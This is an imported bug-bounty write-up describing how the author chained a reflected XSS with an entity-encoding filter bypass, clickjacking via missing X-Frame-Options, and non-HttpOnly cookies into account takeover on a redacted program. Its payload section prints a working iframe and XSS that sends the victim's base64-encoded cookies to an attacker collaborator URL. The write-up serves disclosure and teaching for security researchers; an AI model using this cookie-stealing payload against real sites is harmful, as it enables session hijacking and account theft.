---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-03-10_chain-of-low-level-bugs-and-misconfigurations-leads-to-account-takeover.md
original_filename: 2021-03-10_chain-of-low-level-bugs-and-misconfigurations-leads-to-account-takeover.md
title: Chain of Low Level Bugs and Misconfigurations Leads to Account Takeover
category: documents
detected_topics:
- xss
- clickjacking
- command-injection
- csrf
- api-security
tags:
- imported
- documents
- xss
- clickjacking
- command-injection
- csrf
- api-security
language: en
raw_sha256: d6400eab0ed6d336a4ac3b417b23bb70c0ac8af57efa52e6d85a93080d966080
text_sha256: adaa42f60e1f5bfd2ef6abcb956a62e24f0105fc155e5c20c6b3c1760e81799b
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: false
---

# Chain of Low Level Bugs and Misconfigurations Leads to Account Takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-03-10_chain-of-low-level-bugs-and-misconfigurations-leads-to-account-takeover.md
- Source Type: markdown
- Detected Topics: xss, clickjacking, command-injection, csrf, api-security
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: False
- Raw SHA256: `d6400eab0ed6d336a4ac3b417b23bb70c0ac8af57efa52e6d85a93080d966080`
- Text SHA256: `adaa42f60e1f5bfd2ef6abcb956a62e24f0105fc155e5c20c6b3c1760e81799b`


## Content

---
title: "Chain of Low Level Bugs and Misconfigurations Leads to Account Takeover"
url: "https://infosecwriteups.com/chain-of-low-level-bugs-and-misconfigurations-leads-to-account-takeover-de248fc4e481"
authors: ["pleorqy (@pleorqy)"]
bugs: ["Reflected XSS", "Clickjacking", "Account takeover"]
publication_date: "2021-03-10"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3826
scraped_via: "browseros"
---

# Chain of Low Level Bugs and Misconfigurations Leads to Account Takeover

Chain of Low Level Bugs and Misconfigurations Leads to Account Takeover
pleorqy
Follow
4 min read
·
Mar 10, 2021

245

Hello, fellow hunters. I am going to tell you a tale about one of my recent findings in which I was able to chain several misconfigurations that lead me to takeover any account. I am going to refer to the website as “redacted.com” as it was a private program on HackerOne. Let’s get started.

Step 1 — Reflected XSS

I was navigating through subdomains of my target, looking for interesting functionalities before getting deeper in the application. After a while, I stumbled upon a page that lets me search a blog post by its title. So, briefly it was a classical search box. I observed that every time I put some text in the search box, it was getting reflected to the URL as path:

sub.redacted.com/search/{TEXT_HERE}

As most of us would do, I immediately chucked several XSS payloads but there was no luck, my payloads were getting sanitized. It seemed like a custom bypass system, there were no signs of any WAF. That’s why I decided to dig deeper and tried to bypass the sanitization. After many trials and errors, when I replaced less than sign ‘<’ with its HTML entity form which is &lt; my payload got fired successfully.

Press enter or click to view image in full size
XSS Payload Got Fired Successfully
Step 2 — Clickjacking

Everything seems to be working seamlessly right? Not really. I expected that the payload would fire when I clicked the link, but it did not. The search text was right there where I entered it, but it was not being fired. The victim had to manually click the “Search” button for the payload to be fired. I was going through my logs in Burp Suite and saw that a proper CSRF protection mechanism was in place. I tried to bypass it by trying numerous ways but I couldn’t manage to succeed. While going back and forth in my logs, I noticed that “X-Frame-Options” was missing which meant that the subdomain was vulnerable to clickjacking, which means that the site can be embedded on any site with an iframe.

Step 3 — Raising Impact and Performing ATO

It was all good, but the impact was not high enough. While thinking about ways of raising the impact, I realized that the cookies were missing HttpOnly flag, which meant that they were reachable by using JavaScript.

Yummy

I used this to append the cookie of the victim to the end of the URL as a query parameter. More details below. Final payload that I hosted on my website looked like this more or less:

<!DOCTYPE html>
<html>
<iframe src=https://sub.redacted.com/search/&lt;%20img%20src=x%20onerror=location.href=%22https:%26sol;%26sol;{COLLABORATOR_URL}%26sol;%26quest;q=%22+btoa(document.cookie);%26gt;>
</iframe>
</html>

The decoded version of the above URL:
https://sub.redacted.com/search/<img src=x onerror=location.href=”{COLLABORATOR_URL}/?q="+btoa(document.cookie);>

This step needs elaboration, though.

What is btoa()?

In JavaScript, btoa() is basically a method that encodes a string in base64. Why did I need this? Well, I wasn’t planning to. During the flight, I realized that I could not see the all cookies, because some characters in the cookies were being filtered. This way, when I checked my server logs, I was able to retrieve all the cookies in base64 encoded form.

Performing the Takeover

I am not going to give a detailed explanation on how to perform a clickjacking attack. It would be enough to understand that making a user to click a button is a piece of cake. When the button is clicked by the victim, we have the base64 value.

Get pleorqy’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

What now? Do I just decode the value, replace it with my cookies and the work is done? Indeed it is.

Press enter or click to view image in full size
Cheers.
Takeaways
When you manage to find a reflected XSS, try to escalate the severity by chaining it with other bugs (e.g. CSRF, cache poisoning etc.)
Low-level bugs and misconfigurations might play a critical role in increasing the impact even though they have nearly no value when reported on their own. Do not overlook them!

This was my first write-up. I hope you found this helpful.

You can follow me on Twitter. @pleorqy
